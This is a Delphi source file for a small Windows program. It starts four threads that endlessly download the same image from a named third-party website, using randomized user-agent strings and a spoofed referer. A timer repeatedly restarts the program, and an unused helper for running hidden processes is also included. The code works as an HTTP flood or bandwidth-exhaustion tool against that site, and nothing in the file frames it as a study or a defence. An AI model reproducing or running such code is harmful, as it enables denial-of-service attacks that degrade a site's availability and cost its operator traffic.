unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, shellapi,
  Dialogs, IdBaseComponent, IdComponent, IdTCPConnection, IdTCPClient, IdMultipartFormData,
  IdHTTP, IdIntercept, IdInterceptThrottler, StdCtrls, ExtCtrls;
type
  TMyDownLoad = class(TThread)
  protected
    procedure Execute; override;
    procedure Download;
  end;



type
  TForm1 = class(TForm)
    idhtp1: TIdHTTP;
    IdInterceptThrottler1: TIdInterceptThrottler;
    mmo1: TMemo;
    tmr1: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure tmr1Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

  i1, j1: Integer;
implementation

{$R *.dfm}

function WinExecExW(CMD: Pchar; Visiable: integer): DWORD;
var
  StartupInfo: TStartupInfo;
  ProcessInfo: TProcessInformation;
begin
  FillChar(StartUpInfo, SizeOf(StartUpInfo), $00);
  StartUpInfo.dwFlags := STARTF_USESHOWWINDOW;
  StartUpInfo.wShowWindow := SW_HIDE;
  if CreateProcess(nil, CMD, nil, nil, {运行批处理文件}
    False, IDLE_PRIORITY_CLASS, nil, nil, StartUpInfo,
    ProcessInfo) then
  begin
    WaitForSingleObject(Processinfo.hProcess, INFINITE);
    GetExitCodeProcess(ProcessInfo.hProcess, Result);

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
  end;
end;


function UTF8ToAnsiString(utf8str: string; CodePage: integer): AnsiString;
var
  i: integer;
  buffer: widestring;
  ch, c1, c2: byte;

begin
  result := '';
  i := 1;
  while i <= Length(utf8str) do begin
    ch := byte(utf8str[i]);
    setlength(buffer, length(buffer) + 1);
    if (ch and $80) = 0 then //1-byte
      buffer[length(buffer)] := widechar(ch)
    else begin
      if (ch and $E0) = $C0 then begin // 2-byte
        inc(i);
        c1 := byte(utf8str[i]);
        buffer[length(buffer)] := widechar((word(ch and $1F) shl 6) or (c1 and $3F));
      end
      else begin // 3-byte
        inc(i);
        c1 := byte(utf8str[i]);
        inc(i);
        c2 := byte(utf8str[i]);
        buffer[length(buffer)] := widechar(
          (word(ch and $0F) shl 12) or
          (word(c1 and $3F) shl 6) or
          (c2 and $3F));
      end;
    end;
    inc(i);
  end; //while
  i := WideCharToMultiByte(codePage,
    WC_COMPOSITECHECK or WC_DISCARDNS or WC_SEPCHARS or WC_DEFAULTCHAR,
    @buffer[1], -1, nil, 0, nil, nil);
  if i > 1 then begin
    SetLength(Result, i - 1);
    WideCharToMultiByte(codePage,
      WC_COMPOSITECHECK or WC_DISCARDNS or WC_SEPCHARS or WC_DEFAULTCHAR,
      @buffer[1], -1, @Result[1], i - 1, nil, nil);
  end;
end;

procedure TMyDownLoad.Download;
var
  UnitName, PathName: string;
  MyStream: TMemoryStream;
  filepath: string;
  idHTTP1: TIDHttp;
  j1, j: Integer;
  poststr: string;
  IdInterceptThrottler: tIdInterceptThrottler;
  postStream: TStringStream;


begin
  IdInterceptThrottler := tIdInterceptThrottler.Create;
  IdInterceptThrottler.RecvBitsPerSec := 800000000;
  while 1 = 1 do
  begin
    idHTTP1 := TIDHTTP.Create;
    IdHTTP1.Intercept := IdInterceptThrottler;
    idHTTP1.Request.Connection := 'Keep-Alive';
    idHTTP1.HandleRedirects := True;
    idHTTP1.Intercept := IdInterceptThrottler;
    IdHTTP1.Request.UserAgent := 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;' + IntToStr(Random(9999999999999)) + ' SV1; Maxthon)' + IntToStr(Random(9999999999999));
    IdHTTP1.Request.ContentType := 'application/x-www-form-urlencoded';
    IdHTTP1.Request.Referer := 'http://www.716580.com';
    IdHTTP1.Request.Accept := 'image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/msword, */*';
    idHTTP1.Get('http://www.716580.com/b2b/adv/14.jpg');

    idhttp1.Free;
  end;

end;

procedure TMyDownLoad.Execute;
begin
  inherited;
  Download;
end;


procedure TForm1.FormCreate(Sender: TObject);
begin
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
  TMyDownLoad.Create(false);
end;

procedure TForm1.tmr1Timer(Sender: TObject);
begin
  ShellExecute(0, 'open', PChar(ParamStr(0)), nil, nil, SW_SHOWNORMAL);
  Application.Terminate;
end;

end.

